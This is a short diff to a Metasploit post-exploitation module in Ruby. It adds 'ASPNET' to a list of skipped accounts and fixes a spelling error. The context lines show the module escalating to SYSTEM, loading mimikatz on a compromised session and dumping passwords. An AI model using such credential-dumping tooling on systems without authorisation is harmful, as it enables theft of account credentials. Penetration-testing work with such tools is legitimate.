@@ -65,7 +65,7 @@ class Metasploit3 < Msf::Post
   end
 
   def run
-    bad_accounts = [ 'IIS APPPOOL', 'NT AUTHORITY' ]
+    bad_accounts = [ 'IIS APPPOOL', 'NT AUTHORITY', 'ASPNET'  ]
     get_system if (session.sys.config.getuid() !~ /SYSTEM/ and datastore['GETSYSTEM']) 
     if not priv_check
       print_error("Abort! Did not pass the priv check")
@@ -80,7 +80,7 @@ class Metasploit3 < Msf::Post
     if(session.mimikatz)
       print_good('Mimikatz Loaded!')
     else
-      print_error("Faild to load mimikatz on #{session.sid} / #{session.session_host}")
+      print_error("Failed to load mimikatz on #{session.sid} / #{session.session_host}")
       return
     end
     print_status('Dumping Passwords')
